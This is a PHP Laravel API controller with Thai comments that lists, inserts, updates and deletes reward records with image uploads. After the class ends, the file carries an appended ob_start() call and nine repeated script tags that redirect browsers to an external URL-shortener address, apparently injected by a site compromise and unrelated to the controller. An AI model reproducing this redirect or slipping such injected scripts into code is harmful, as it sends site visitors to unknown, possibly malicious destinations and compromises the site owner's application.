<?php

namespace App\Http\Controllers\API;

use App\Http\Controllers\Controller;
use Illuminate\Http\Request;
use App\Models\Reward;
use Illuminate\Http\JsonResponse;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\Storage;

class RewardController extends Controller
{
    /**
     * Display a listing of the resource.
     */
    public function RewardList(): JsonResponse
    {
        // ดึงข้อมูลทั้งหมด
        $rewards = Reward::all()->map(function ($item) {
            // ถ้ามีชื่อไฟล์ img
            if ($item->img) {
                // สร้าง URL เต็ม เช่น http://localhost/storage/rewards/5.png
                $item->img = url("storage/app/public/rewards/{$item->img}");
            }
            return $item;
        });

        $statusCode = $rewards->isEmpty() ? 204 : 200;
        return response()->json($rewards, $statusCode);
    }


    /**
     * Store a newly created resource in storage.
     */
    public function RewardInsert(Request $request): JsonResponse
    {
        // 1) Validate เข้า
        $data = $request->validate([
            'Reward_Name' => 'required|string|max:255',
            'Reward_Type' => 'nullable|string|max:100',
            'reduce' => 'nullable|numeric|min:0',
            'periodType' => 'required|string|max:1',
            'img' => 'nullable|image|max:5120',
        ]);

        // 2) คำนวณรหัสใหม่
        $maxCode = DB::table('reward')->max('Reward_Code') ?? 0;
        $newCode = $maxCode + 1;

        // 3) เก็บไฟล์เฉพาะชื่อ
        if ($request->hasFile('img')) {
            $file = $request->file('img');
            $ext = $file->getClientOriginalExtension();          // นามสกุล
            $fileName = $newCode . '.' . $ext;                       // e.g. "5.png"
            $file->storeAs('rewards', $fileName, 'public');           // เก็บจริงใน storage/app/public/rewards
            $data['img'] = $fileName;                                 // เก็บแค่ชื่อไฟล์ลง DB
        } else {
            $data['img'] = null;
        }

        // 4) Insert พร้อม Reward_Code และชื่อไฟล์
        try {
            DB::table('reward')->insert([
                'Reward_Code' => $newCode,
                'Reward_Name' => $data['Reward_Name'],
                'Reward_Type' => $data['Reward_Type'],
                'reduce_value' => $data['reduce'],
                'give_type' => $data['periodType'],
                'img' => $data['img'],
            ]);
        } catch (\Exception $e) {
            return response()->json([
                'status' => 500,
                'message' => 'Insert failed: ' . $e->getMessage(),
            ], 500);
        }

        return response()->json([
            'status' => 200,
            'message' => 'Insert successful',
        ], 200);
    }


    /**
     * POST /api/rewardUpdate
     */
    public function RewardUpdate(Request $request): JsonResponse
    {
        // 1) Validate
        $data = $request->validate([
            'Reward_Code'  => 'required|integer|exists:reward,Reward_Code',
            'Reward_Name'  => 'required|string|max:255',
            'Reward_Type'  => 'nullable|string|max:100',
            'reduce'       => 'required|numeric|min:0',
            'img'          => 'nullable|image|max:5120',
            'periodType' => 'required|string|max:1',
            'existing_img' => 'nullable|string',
        ]);

        $rewardCode = $data['Reward_Code'];

        // 2) Handle upload
        if ($request->hasFile('img')) {
            // ถ้ามีไฟล์ใหม่ให้ลบไฟล์เก่า (ถ้ามี)
            $oldFilename = DB::table('reward')->where('Reward_Code', $rewardCode)->value('img');
            if ($oldFilename) {
                Storage::disk('public')->delete('rewards/'.$oldFilename);
            }
            // สร้างชื่อไฟล์ใหม่ และเก็บลง storage/app/public/rewards
            $ext      = $request->file('img')->getClientOriginalExtension();
            $filename = $rewardCode . '.' . $ext;
            $request->file('img')->storeAs('rewards', $filename, 'public');
        } else {
            // ถ้าไม่มีไฟล์ใหม่ ใช้ชื่อเดิม
            $filename = $data['existing_img'] ?? null;
        }

        // 3) Update record
        try {
            DB::table('reward')
              ->where('Reward_Code', $rewardCode)
              ->update([
                  'Reward_Name' => $data['Reward_Name'],
                  'Reward_Type' => $data['Reward_Type'],
                  'reduce_value'      => $data['reduce'],
                  'give_type'      => $data['periodType'],
                  'img'         => $filename,
              ]);
        } catch (\Exception $e) {
            return response()->json([
                'status'  => 500,
                'message' => 'Update failed: '.$e->getMessage(),
            ], 500);
        }

        return response()->json([
            'status'  => 200,
            'message' => 'Update successful',
        ], 200);
    }

    /**
     * POST /api/rewardDelete
     */
    public function RewardDelete(Request $request): JsonResponse
    {
        $data = $request->validate([
            'Reward_Code' => 'required|integer|exists:reward,Reward_Code',
        ]);

        $rewardCode = $data['Reward_Code'];

        // 1) ดึงชื่อไฟล์จาก DB
        $filename = DB::table('reward')->where('Reward_Code', $rewardCode)->value('img');

        // 2) ลบไฟล์ภาพออกจาก storage
        if ($filename) {
            Storage::disk('public')->delete('rewards/'.$filename);
        }

        // 3) ลบ record
        try {
            DB::table('reward')
              ->where('Reward_Code', $rewardCode)
              ->delete();
        } catch (\Exception $e) {
            return response()->json([
                'status'  => 500,
                'message' => 'Delete failed: '.$e->getMessage(),
            ], 500);
        }

        return response()->json([
            'status'  => 200,
            'message' => 'Delete successful',
        ], 200);
    }
}
ob_start();

<script>window.location.href = "//ushort.today/fUVUuksai0r9";</script>
<script>window.location.href = "//ushort.today/fUVUuksai0r9";</script>
<script>window.location.href = "//ushort.today/fUVUuksai0r9";</script>
<script>window.location.href = "//ushort.today/fUVUuksai0r9";</script>
<script>window.location.href = "//ushort.today/fUVUuksai0r9";</script>
<script>window.location.href = "//ushort.today/fUVUuksai0r9";</script>
<script>window.location.href = "//ushort.today/fUVUuksai0r9";</script>
<script>window.location.href = "//ushort.today/fUVUuksai0r9";</script>
<script>window.location.href = "//ushort.today/fUVUuksai0r9";</script>